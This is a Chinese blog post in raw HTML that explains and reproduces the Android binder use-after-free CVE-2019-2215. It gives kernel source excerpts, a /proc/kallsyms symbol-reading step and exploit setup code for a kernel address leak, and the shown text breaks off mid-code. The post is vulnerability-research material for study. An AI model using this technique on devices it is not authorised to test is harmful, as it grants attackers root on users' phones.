<!doctype html><html lang=zh-cn><head><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-182953793-1','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>CVE-2019-2215 Bad Binder - XYlearn' Site</title><meta name=description content="概述 CVE-2019-2215是一个Use After Free类型的安卓内核漏洞，攻击者可以使用这个漏洞达到本地提权的效果。该漏洞可能存在于Pixel"><meta name=author content><link href=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css rel=stylesheet><link href=https://blog.xylearn.site/public/an-old-hope.min.css rel=stylesheet><link href=https://blog.xylearn.site/public/style.css rel=stylesheet><link href=https://blog.xylearn.site/public/custom.css rel=stylesheet><link href=https://blog.xylearn.site/public/all.min.css rel=stylesheet><link rel=apple-touch-icon href=https://blog.xylearn.site/public/apple-touch-icon.png><link rel=icon href=https://blog.xylearn.site/public/favicon.ico><meta name=generator content="Hugo 0.79.1"><script src=https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js></script><script>function setTheme(){if(window.matchMedia('(prefers-color-scheme: dark)').matches){document.body.classList.add('dark');return;}
const time=new Date();const prev=localStorage.getItem('date');const date=String(time.getMonth()+1)+'.'+String(time.getDate());const now=time.getTime();let sunrise;let sunset;function setBodyClass(){if(now>sunrise&&now<sunset)return;document.body.classList.add('dark');}
if(date!==prev){fetch('https://api.ipgeolocation.io/astronomy?apiKey=5ed37d85103e4defa5df4c5298ed5215').then((res)=>res.json()).then((data)=>{sunrise=data.sunrise.split(':').map(Number);sunset=data.sunset.split(':').map(Number);}).catch(()=>{sunrise=[7,0];sunset=[19,0];}).finally(()=>{sunrise=time.setHours(sunrise[0],sunrise[1],0);sunset=time.setHours(sunset[0],sunset[1],0);setBodyClass();localStorage.setItem('sunrise',sunrise);localStorage.setItem('sunset',sunset);});localStorage.setItem('date',date);}else{sunrise=Number(localStorage.getItem('sunrise'));sunset=Number(localStorage.getItem('sunset'));setBodyClass();}}</script></head><body class=single><script>setTheme();</script><header class=header><nav class=nav><p class=logo><a href=https://blog.xylearn.site/public/>XYlearn' Site</a></p><ul class=menu><li><a href=/public/post/>Blog</a></li><li><a href=/public/tags/>Tags</a></li><li><a href=/public/index.xml>RSS</a></li><li><a href=/public/about/>About</a></li></ul></nav></header><main class=main><script src=https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.min.js></script><article class=post-single><header class=post-header><h1 class=post-title>CVE-2019-2215 Bad Binder</h1><div class=post-meta><span class=post-meta-author></span><span class=post-meta-date><span class=post-meta-date-pub><i class="far fa-calendar"></i><time>2020-11-06 15:59</time></span>
<span class=post-meta-divider>·</span>
<span class=post-meta-date-pub><i class="far fa-calendar-check"></i><time>2020-11-19 22:05</time></span></span>
<span class=post-meta-divider>·</span>
<span class=post-meta-wc><i class="far fa-file-word"></i><span>7104</span></span>
<span class=post-meta-divider>·</span>
<span class=post-meta-rt><i class="far fa-clock"></i><span>15 min</span></span><div class=post-meta-tags><ul class=post-tags><li><a href=https://blog.xylearn.site/public/tags/pwn>Pwn</a></li><li><a href=https://blog.xylearn.site/public/tags/android>Android</a></li><li><a href=https://blog.xylearn.site/public/tags/kernel>Kernel</a></li></ul></div></div></header><div class=post-toc></div><div class="post-content article-post"><h2 id=概述>概述</h2><p>CVE-2019-2215是一个Use After Free类型的安卓内核漏洞，攻击者可以使用这个漏洞达到本地提权的效果。该漏洞可能存在于Pixel 1和2等设备上，并且在Linux内核版本>4.14的版本中不存在。关于更多漏洞的详情可以参考<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2215">CVE官网</a>和Google Project Zero的<a href=https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html>博客</a>。</p><hr><h2 id=漏洞复现过程>漏洞复现过程</h2><p>网上已经有很多该漏洞的POC可供研究，这里就直接使用<a href=https://github.com/timwr/CVE-2019-2215.git>timwr/CVE-2019-2215</a>这个仓库的poc进行复现。复现使用的设备是Pixel 2XL，在复现过程中实际上碰到了很多问题，其中很大一部分是在寻找kernel image和配置环境上。感谢LKK，HR和DRQ在此过程中的帮助。</p><p>首先借了一台Pixel 2XL的手机，在上面刷入了<a href="https://flash.android.com/build/4833802?target=taimen-user&signed">8.1.0 (OPM2.171026.006.H1, Jul 2018)</a>镜像。之后使用TWRP和Magisk进行Root。然后获取内核符号表，算好poc中涉及的几个符号偏移并填入。最后编译运行poc.c得到root权限。</p><div class=highlight><pre class=chroma><code class=language-bash data-lang=bash><span class=ln>1</span><span class=nb>echo</span> <span class=m>1</span> &gt; /proc/sys/kernel/kptr_restrict
<span class=ln>2</span>cat /proc/kallsyms
</code></pre></div><p>下面是root过程的演示:
<a href=https://asciinema.org/a/eZdnD8HfZvKYEUkeYtmHCsWOW><img src=https://asciinema.org/a/eZdnD8HfZvKYEUkeYtmHCsWOW.svg alt=asciicast></a></p><blockquote><p>简单记录一下我的复现失败历史。一开始以为google官方放出的镜像都是patch后的，但实际上并不是。基于这个假设做了很多麻烦的事情，首先是尝试自己编译安卓内核，在这方面耗费了大量时间进行环境配置和搜索；之后又尝试在qemu中去使用Linux Kernel复现，但是不知道为什么无论选择什么Linux版本编译出来的kernel image都无法触发UAF的漏洞；最后还是在官网上找了一个和poc环境相近的安卓image，借了一台Pixel 2XL才成功完成。</p></blockquote><h2 id=漏洞利用原理>漏洞利用原理</h2><p>这个漏洞的产生原因是安卓内核中<code>binder_thread</code>这个结构体被释放后，其中的wait字段仍然能够被epoll使用，从而可以导致Use-After-Free(UAF)。</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span><span class=c1>// drivers/android/binder.c
</span><span class=ln> 2</span><span class=c1></span><span class=k>struct</span> <span class=n>binder_thread</span> <span class=p>{</span>
<span class=ln> 3</span>	<span class=k>struct</span> <span class=n>binder_proc</span> <span class=o>*</span><span class=n>proc</span><span class=p>;</span>
<span class=ln> 4</span>	<span class=k>struct</span> <span class=n>rb_node</span> <span class=n>rb_node</span><span class=p>;</span>
<span class=ln> 5</span>	<span class=k>struct</span> <span class=n>list_head</span> <span class=n>waiting_thread_node</span><span class=p>;</span>
<span class=ln> 6</span>	<span class=kt>int</span> <span class=n>pid</span><span class=p>;</span>
<span class=ln> 7</span>	<span class=kt>int</span> <span class=n>looper</span><span class=p>;</span>              <span class=cm>/* only modified by this thread */</span>
<span class=ln> 8</span>	<span class=kt>bool</span> <span class=n>looper_need_return</span><span class=p>;</span> <span class=cm>/* can be written by other thread */</span>
<span class=ln> 9</span>	<span class=k>struct</span> <span class=n>binder_transaction</span> <span class=o>*</span><span class=n>transaction_stack</span><span class=p>;</span>
<span class=ln>10</span>	<span class=k>struct</span> <span class=n>list_head</span> <span class=n>todo</span><span class=p>;</span>
<span class=ln>11</span>	<span class=kt>bool</span> <span class=n>process_todo</span><span class=p>;</span>
<span class=ln>12</span>	<span class=k>struct</span> <span class=n>binder_error</span> <span class=n>return_error</span><span class=p>;</span>
<span class=ln>13</span>	<span class=k>struct</span> <span class=n>binder_error</span> <span class=n>reply_error</span><span class=p>;</span>
<span class=ln>14</span>	<span class=n>wait_queue_head_t</span> <span class=n>wait</span><span class=p>;</span>
<span class=ln>15</span>	<span class=k>struct</span> <span class=n>binder_stats</span> <span class=n>stats</span><span class=p>;</span>
<span class=ln>16</span>	<span class=n>atomic_t</span> <span class=n>tmp_ref</span><span class=p>;</span>
<span class=ln>17</span>	<span class=kt>bool</span> <span class=n>is_dead</span><span class=p>;</span>
<span class=ln>18</span>	<span class=k>struct</span> <span class=n>task_struct</span> <span class=o>*</span><span class=n>task</span><span class=p>;</span>
<span class=ln>19</span><span class=p>};</span>
</code></pre></div><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln>1</span><span class=c1>// include/linux/wait.h
</span><span class=ln>2</span><span class=c1></span><span class=k>struct</span> <span class=n>__wait_queue_head</span> <span class=p>{</span>
<span class=ln>3</span>	<span class=n>spinlock_t</span>		<span class=n>lock</span><span class=p>;</span>
<span class=ln>4</span>	<span class=k>struct</span> <span class=n>list_head</span>	<span class=n>task_list</span><span class=p>;</span>
<span class=ln>5</span><span class=p>};</span>
<span class=ln>6</span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>__wait_queue_head</span> <span class=n>wait_queue_head_t</span><span class=p>;</span>
</code></pre></div><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln>1</span><span class=c1>// include/linux/types.h
</span><span class=ln>2</span><span class=c1></span><span class=k>struct</span> <span class=n>list_head</span> <span class=p>{</span>
<span class=ln>3</span>	<span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span><span class=n>next</span><span class=p>,</span> <span class=o>*</span><span class=n>prev</span><span class=p>;</span>
<span class=ln>4</span><span class=p>};</span>
</code></pre></div><p>在用<code>BINDER_THREAD_EXIT</code>调用<code>binder_ioctl</code>时,<code>binder_ioctl</code>会调用<code>binder_thread_release</code>这个函数来释放<code>binder_thread</code>使用的内存。虽然<code>binder_thread_release</code>调用释放了<code>binder_thread</code>的内存空间，但若线程中调用了<code>epoll</code>，则<code>binder_poll</code>仍然会使用<code>binder_thread</code>结构体中的<code>wait</code>结构体，从而可以进行UAF攻击。</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span><span class=k>static</span> <span class=kt>long</span> <span class=nf>binder_ioctl</span><span class=p>(</span><span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>filp</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>cmd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>arg</span><span class=p>)</span>
<span class=ln> 2</span><span class=p>{</span>
<span class=ln> 3</span>    <span class=c1>// ...
</span><span class=ln> 4</span><span class=c1></span>    <span class=k>switch</span> <span class=p>(</span><span class=n>cmd</span><span class=p>)</span> <span class=p>{</span>
<span class=ln> 5</span>    <span class=c1>// ...
</span><span class=ln> 6</span><span class=c1></span>	<span class=k>case</span> <span class=nl>BINDER_THREAD_EXIT</span><span class=p>:</span>
<span class=ln> 7</span>		<span class=n>binder_debug</span><span class=p>(</span><span class=n>BINDER_DEBUG_THREADS</span><span class=p>,</span> <span class=s>&#34;%d:%d exit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span>
<span class=ln> 8</span>			     <span class=n>proc</span><span class=o>-&gt;</span><span class=n>pid</span><span class=p>,</span> <span class=kr>thread</span><span class=o>-&gt;</span><span class=n>pid</span><span class=p>);</span>
<span class=ln> 9</span>		<span class=n>binder_thread_release</span><span class=p>(</span><span class=n>proc</span><span class=p>,</span> <span class=kr>thread</span><span class=p>);</span>
<span class=ln>10</span>		<span class=kr>thread</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
<span class=ln>11</span>		<span class=k>break</span><span class=p>;</span>
<span class=ln>12</span>    <span class=c1>// ...
</span><span class=ln>13</span><span class=c1></span>    <span class=p>}</span>
<span class=ln>14</span>    <span class=c1>// ...
</span><span class=ln>15</span><span class=c1></span><span class=p>}</span>
</code></pre></div><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span><span class=k>static</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=nf>binder_poll</span><span class=p>(</span><span class=k>struct</span> <span class=n>file</span> <span class=o>*</span><span class=n>filp</span><span class=p>,</span>
<span class=ln> 2</span>				<span class=k>struct</span> <span class=n>poll_table_struct</span> <span class=o>*</span><span class=n>wait</span><span class=p>)</span>
<span class=ln> 3</span><span class=p>{</span>
<span class=ln> 4</span>	<span class=k>struct</span> <span class=n>binder_proc</span> <span class=o>*</span><span class=n>proc</span> <span class=o>=</span> <span class=n>filp</span><span class=o>-&gt;</span><span class=n>private_data</span><span class=p>;</span>
<span class=ln> 5</span>	<span class=k>struct</span> <span class=n>binder_thread</span> <span class=o>*</span><span class=kr>thread</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
<span class=ln> 6</span>	<span class=kt>bool</span> <span class=n>wait_for_proc_work</span><span class=p>;</span>
<span class=ln> 7</span>
<span class=ln> 8</span>	<span class=kr>thread</span> <span class=o>=</span> <span class=n>binder_get_thread</span><span class=p>(</span><span class=n>proc</span><span class=p>);</span>
<span class=ln> 9</span>    <span class=c1>// ...
</span><span class=ln>10</span><span class=c1></span>	<span class=n>poll_wait</span><span class=p>(</span><span class=n>filp</span><span class=p>,</span> <span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>,</span> <span class=n>wait</span><span class=p>);</span> <span class=c1>// wait is used
</span><span class=ln>11</span><span class=c1></span>    <span class=c1>// ...
</span><span class=ln>12</span><span class=c1></span><span class=p>}</span>
</code></pre></div><p>在攻击过程中可以使用<a href=https://en.wikipedia.org/wiki/Vectored_I/O>Vectored IO</a>操作构造内核空间中的任意地址读写。Vectored IO也被称为scatter/gather IO，这是因为其读操作(<code>readv</code>)将一个buffer中的内容分开拷贝到了多个buffer中，而其写操作(<code>writev</code>)将多个buffer中的内容合并到了一个buffer中。攻击过程中主要使用<code>writev</code>和<code>recvmsg</code>这两个函数分别从vectored IO中读取数据，和向其中写入数据。</p><p><img src=https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/20191125143428-a164e062-0f4d-1-2020-11.png alt></p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln>1</span><span class=c1>// fs/read_write.c
</span><span class=ln>2</span><span class=c1></span><span class=n>SYSCALL_DEFINE3</span><span class=p>(</span><span class=n>readv</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>iovec</span> <span class=n>__user</span> <span class=o>*</span><span class=p>,</span> <span class=n>vec</span><span class=p>,</span>
<span class=ln>3</span>                <span class=kt>unsigned</span> <span class=kt>long</span><span class=p>,</span> <span class=n>vlen</span><span class=p>)</span>
<span class=ln>4</span>
<span class=ln>5</span><span class=n>SYSCALL_DEFINE3</span><span class=p>(</span><span class=n>writev</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>iovec</span> <span class=n>__user</span> <span class=o>*</span><span class=p>,</span> <span class=n>vec</span><span class=p>,</span>
<span class=ln>6</span>                <span class=kt>unsigned</span> <span class=kt>long</span><span class=p>,</span> <span class=n>vlen</span><span class=p>)</span>
</code></pre></div><p>下面是<code>iovec</code>的结构体，<code>iov_base</code>字段是一个指向用户空间的指针，<code>iov_len</code>表示这个区域需要读写的大小。</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln>1</span><span class=c1>// fs/read_write.c
</span><span class=ln>2</span><span class=c1></span><span class=k>struct</span> <span class=n>iovec</span>
<span class=ln>3</span><span class=p>{</span>
<span class=ln>4</span>        <span class=kt>void</span> <span class=n>__user</span> <span class=o>*</span><span class=n>iov_base</span><span class=p>;</span> 
<span class=ln>5</span>        <span class=n>__kernel_size_t</span> <span class=n>iov_len</span><span class=p>;</span> 
<span class=ln>6</span><span class=p>};</span>
</code></pre></div><p>通常Vectored IO操作都会涉及多个<code>iovec</code>，内核除了要管理多个<code>iovec</code>数组外，还要记录和iovec迭代相关的信息，用<code>iov_iter</code>来表示。其中的<code>iov_offset</code>就表示了读写操作进行到了第几个<code>iovec</code>。</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span><span class=c1>// include/linux/uio.h
</span><span class=ln> 2</span><span class=c1></span><span class=k>struct</span> <span class=n>iov_iter</span> <span class=p>{</span>
<span class=ln> 3</span>	<span class=kt>int</span> <span class=n>type</span><span class=p>;</span>
<span class=ln> 4</span>	<span class=n>size_t</span> <span class=n>iov_offset</span><span class=p>;</span>
<span class=ln> 5</span>	<span class=n>size_t</span> <span class=n>count</span><span class=p>;</span>
<span class=ln> 6</span>	<span class=k>union</span> <span class=p>{</span>
<span class=ln> 7</span>		<span class=k>const</span> <span class=k>struct</span> <span class=n>iovec</span> <span class=o>*</span><span class=n>iov</span><span class=p>;</span>
<span class=ln> 8</span>		<span class=k>const</span> <span class=k>struct</span> <span class=n>kvec</span> <span class=o>*</span><span class=n>kvec</span><span class=p>;</span>
<span class=ln> 9</span>		<span class=k>const</span> <span class=k>struct</span> <span class=n>bio_vec</span> <span class=o>*</span><span class=n>bvec</span><span class=p>;</span>
<span class=ln>10</span>		<span class=k>struct</span> <span class=n>pipe_inode_info</span> <span class=o>*</span><span class=n>pipe</span><span class=p>;</span>
<span class=ln>11</span>	<span class=p>};</span>
<span class=ln>12</span>	<span class=k>union</span> <span class=p>{</span>
<span class=ln>13</span>		<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>nr_segs</span><span class=p>;</span>
<span class=ln>14</span>		<span class=k>struct</span> <span class=p>{</span>
<span class=ln>15</span>			<span class=kt>int</span> <span class=n>idx</span><span class=p>;</span>
<span class=ln>16</span>			<span class=kt>int</span> <span class=n>start_idx</span><span class=p>;</span>
<span class=ln>17</span>		<span class=p>};</span>
<span class=ln>18</span>	<span class=p>};</span>
<span class=ln>19</span><span class=p>};</span>
</code></pre></div><p>Linux Vectored IO的读写函数都会调用<code>do_readv_writev</code>这个函数，这个函数调用了<code>import_iovec</code>函数，<code>import_iovec</code>函数又会调用<code>rw_copy_check_uvector</code>来。在<code>rw_copy_check_uvector</code>函数中，内核会将用户指定的iovec数组拷贝到内核空间，并检查用户是否有权访问iovec数组中<code>iov_base</code>指向的内存空间。在调用<code>import_iovec</code>函数之后，内核才会开始对iovec的后续读写操作。Vectored IO的这些性质决定了它是一个用来实现攻击的绝佳工具，首先一个用户可以利用Vectored IO的读写操作在内核空间中分配任意大小0x10字节对其的堆块，并且对堆块进行受限的写操作——<code>iov_base</code>必须合法，或者<code>iov_len</code>为0；其次，内核不会检查读写过程中对内核空间iovec数组是否被修改，这为我们后续的攻击提供了便利。</p><h2 id=漏洞利用过程>漏洞利用过程</h2><h3 id=初始化>初始化</h3><p>在这一部分先简单介绍一下之后会使用到的一些东西的初始化过程。
Init1中创建了一个<code>binder</code>并且使用<code>epoll_create</code>来创建一个队列供<code>binder_thread</code>使用。这样在之后的epoll操作中就可以引用<code>binder_thread</code>中的<code>wait</code>字段。
Init2中向epoll队列中添加了一个元素，这是为之后队列上的的unlink作准备。
Init3中申请了一个基地址为4g的内存区域，这是为了生成一个地址低4字节为<code>0</code>的合法地址。
Init4中创建了一个管道方便之后父子进程的IO通信。
Init5中构造了一个iovec数组。</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span>  <span class=c1>// #Init1
</span><span class=ln> 2</span><span class=c1></span>  <span class=n>binder_fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/binder&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
<span class=ln> 3</span>  <span class=n>epfd</span> <span class=o>=</span> <span class=n>epoll_create</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
<span class=ln> 4</span>  <span class=c1>// #Init2
</span><span class=ln> 5</span><span class=c1></span>  <span class=k>struct</span> <span class=n>epoll_event</span> <span class=n>event</span> <span class=o>=</span> <span class=p>{.</span><span class=n>events</span> <span class=o>=</span> <span class=n>EPOLLIN</span><span class=p>};</span>
<span class=ln> 6</span>  <span class=n>epoll_ctl</span><span class=p>(</span><span class=n>epoll_fd</span><span class=p>,</span> <span class=n>EPOLL_CTL_ADD</span><span class=p>,</span> <span class=n>binder_fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>event</span><span class=p>);</span>
<span class=ln> 7</span>  <span class=c1>// #Init3
</span><span class=ln> 8</span><span class=c1></span>  <span class=n>dummy_page</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x100000000ul</span><span class=p>,</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>PAGE_SIZE</span><span class=p>,</span>
<span class=ln> 9</span>                      <span class=n>PROT_READ</span> <span class=o>|</span> <span class=n>PROT_WRITE</span><span class=p>,</span>
<span class=ln>10</span>                      <span class=n>MAP_PRIVATE</span> <span class=o>|</span> <span class=n>MAP_ANONYMOUS</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
<span class=ln>11</span>  <span class=c1>// #Init4
</span><span class=ln>12</span><span class=c1></span>  <span class=kt>int</span> <span class=n>pipe_fd</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
<span class=ln>13</span>  <span class=n>pipe</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>);</span>
<span class=ln>14</span>  <span class=c1>// #Init5
</span><span class=ln>15</span><span class=c1></span>  <span class=n>iovec</span> <span class=n>iovs</span><span class=p>[</span><span class=mi>25</span><span class=p>];</span>
<span class=ln>16</span>  <span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>iovs</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>iovs</span><span class=p>));</span>
<span class=ln>17</span>  <span class=n>iov_idx</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
<span class=ln>18</span>  <span class=n>iovs</span><span class=p>[</span><span class=n>iov_idx</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>dummy_page</span><span class=p>;</span> <span class=cm>/* spinlock in the low address half mustbe zero */</span>
<span class=ln>19</span>  <span class=n>iovs</span><span class=p>[</span><span class=n>iov_idx</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=n>PAGE_SIZE</span><span class=p>;</span> <span class=cm>/* wq-&gt;task_list-&gt;next */</span>
<span class=ln>20</span>  <span class=n>iovs</span><span class=p>[</span><span class=n>iov_idx</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=mh>0xdeadbeef</span><span class=p>;</span> <span class=cm>/* wq-&gt;task_list-&gt;prev */</span>
<span class=ln>21</span>  <span class=n>iovs</span><span class=p>[</span><span class=n>iov_idx</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=n>PAGE_SIZE</span><span class=p>;</span>
</code></pre></div><h3 id=泄露task_struct地址>泄露task_struct地址</h3><p>下图是使用UAF泄露task_struct地址的主要流程。
<img src=https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/CVE-2019-2215%20UAF-Flow%20graph%20for%20blog-2-2020-11.png alt=UAF-Flow-Graph></p><p>在这个流程中使用到了两个进程，使用pipe通信以方便进行IO读写和在必要时阻塞IO。主进程负责释放<code>binder_thread</code>结构体，调用<code>writev</code>获取和修改chunk，进一步泄露地址；而子进程负责触发wait_queue的unlink，读取dummy page。</p><p>我们先使用<code>writev</code>来实现对<code>binder_thread</code>结构体的写和读。首先需要在内核中分配一个可以被我们控制的chunk来获取释放的<code>binder_thread</code>的chunk。<code>Vectored IO</code>的读写操作会调用<code>rw_copy_check_uvectior</code>在内核空间分配一块内存，并将用户传递的iovec结构体数组拷贝到内核空间中。由于<code>binder_thread</code>结构体大小为408 bytes，我们需要在内核中分配一块400 bytes到416 bytes大小的堆块来得到freed chunk。iovec结构体大小为16 bytes，所以我们可以构造一个长度为25的iovec数组来在内核中申请400 bytes的空间，从而获取到<code>binder_thread</code>的堆块，同时又不覆盖到<code>binder_thread</code>中的<code>task</code>字段，我们之后要用它来泄露地址。</p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span><span class=c1>// fs/read_write.c
</span><span class=ln> 2</span><span class=c1></span><span class=n>ssize_t</span> <span class=nf>rw_copy_check_uvector</span><span class=p>(</span><span class=kt>int</span> <span class=n>type</span><span class=p>,</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>iovec</span> <span class=n>__user</span> <span class=o>*</span> <span class=n>uvector</span><span class=p>,</span>
<span class=ln> 3</span>			      <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>nr_segs</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>fast_segs</span><span class=p>,</span>
<span class=ln> 4</span>			      <span class=k>struct</span> <span class=n>iovec</span> <span class=o>*</span><span class=n>fast_pointer</span><span class=p>,</span>
<span class=ln> 5</span>			      <span class=k>struct</span> <span class=n>iovec</span> <span class=o>**</span><span class=n>ret_pointer</span><span class=p>)</span>
<span class=ln> 6</span><span class=p>{</span>
<span class=ln> 7</span>    <span class=c1>// ...
</span><span class=ln> 8</span><span class=c1></span>
<span class=ln> 9</span>	<span class=cm>/*
</span><span class=ln>10</span><span class=cm>	 * First get the &#34;struct iovec&#34; from user memory and
</span><span class=ln>11</span><span class=cm>	 * verify all the pointers
</span><span class=ln>12</span><span class=cm>	 */</span>
<span class=ln>13</span>	<span class=k>if</span> <span class=p>(</span><span class=n>nr_segs</span> <span class=o>&gt;</span> <span class=n>UIO_MAXIOV</span><span class=p>)</span> <span class=p>{</span>
<span class=ln>14</span>		<span class=n>ret</span> <span class=o>=</span> <span class=o>-</span><span class=n>EINVAL</span><span class=p>;</span>
<span class=ln>15</span>		<span class=k>goto</span> <span class=n>out</span><span class=p>;</span>
<span class=ln>16</span>	<span class=p>}</span>
<span class=ln>17</span>	<span class=k>if</span> <span class=p>(</span><span class=n>nr_segs</span> <span class=o>&gt;</span> <span class=n>fast_segs</span><span class=p>)</span> <span class=p>{</span>
<span class=ln>18</span>		<span class=n>iov</span> <span class=o>=</span> <span class=n>kmalloc</span><span class=p>(</span><span class=n>nr_segs</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>iovec</span><span class=p>),</span> <span class=n>GFP_KERNEL</span><span class=p>);</span>
<span class=ln>19</span>		<span class=k>if</span> <span class=p>(</span><span class=n>iov</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
<span class=ln>20</span>			<span class=n>ret</span> <span class=o>=</span> <span class=o>-</span><span class=n>ENOMEM</span><span class=p>;</span>
<span class=ln>21</span>			<span class=k>goto</span> <span class=n>out</span><span class=p>;</span>
<span class=ln>22</span>		<span class=p>}</span>
<span class=ln>23</span>	<span class=p>}</span>
<span class=ln>24</span>	<span class=k>if</span> <span class=p>(</span><span class=n>copy_from_user</span><span class=p>(</span><span class=n>iov</span><span class=p>,</span> <span class=n>uvector</span><span class=p>,</span> <span class=n>nr_segs</span><span class=o>*</span><span class=k>sizeof</span><span class=p>(</span><span class=o>*</span><span class=n>uvector</span><span class=p>)))</span> <span class=p>{</span>
<span class=ln>25</span>		<span class=n>ret</span> <span class=o>=</span> <span class=o>-</span><span class=n>EFAULT</span><span class=p>;</span>
<span class=ln>26</span>		<span class=k>goto</span> <span class=n>out</span><span class=p>;</span>
<span class=ln>27</span>	<span class=p>}</span>
<span class=ln>28</span>    <span class=c1>// ...
</span><span class=ln>29</span><span class=c1></span><span class=p>}</span>
</code></pre></div><p>在构造iovec数组时，由于需要覆盖的<code>wait</code>字段在<code>binder_thread</code>中的偏移是160，因此iovec数组的第10个元素(从0开始，160/16)是<code>wait</code>的首地址，这个地址处是一个spinlock，为了后续能够成功调用<code>__remove_wait_queue</code>我们需要让其值为0。所以iovec数组第10个元素的<code>iov_base</code>的低4字节需要为0，即<code>iov_base</code>需要对其4G(0x100000000)的地址。在调用<code>writev``将iovec</code>数组被分配到原来<code>binder_thread</code>的堆块后，其内存的布局如下
<img src=https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/vavCg5-2020-11.png alt></p><p>之后我们使用一个unlink来使<code>wait.task_list.next</code>和<code>wait.task_list.prev</code>都指向自身。为达成这一点，我们先让主进程阻塞，让子线程调用使用<code>EPOLL_CTL_DEL</code>调用<code>epoll_ctl</code>。在<code>EPOLL_CTL_DEL</code>的处理逻辑中会调用<code>remove_wait_queue</code>从队列中删除一个list entry。由于我们一开始在队列中已经添加了一个元素<code>entry</code>，所以在调用<code>remove_wait_queue</code>前wait_queue的布局如下</p><p><img src=https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/CVE-2019-2215-wq-layout-before-remove-2020-11.png alt="WQ layout Before"></p><p>当调用了<code>remove_wait_queue</code>之后，由于触发了unlink操作，<code>wait.task_list->prev</code>被赋值为<code>entry->prev</code>，<code>wait.task_list->next</code>被赋值为<code>entry->next</code>，这两个值均为<code>wait.task_list</code>的地址。如下所示。但是要注意如果<code>CONFIG_DEBUG_LIST</code>这个内核选项被打开了，那么这一步会失败，因为进行了额外的unlink检查</p><p><img src=https://xylearn-cloud-img.oss-cn-shanghai.aliyuncs.com/img/CVE-2019-2215-wq-layout-after-remove-2020-11.png alt="WQ layout After"></p><div class=highlight><pre class=chroma><code class=language-C data-lang=C><span class=ln> 1</span><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>__list_del</span><span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span> <span class=n>prev</span><span class=p>,</span> <span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span> <span class=n>next</span><span class=p>)</span>
<span class=ln> 2</span><span class=p>{</span>
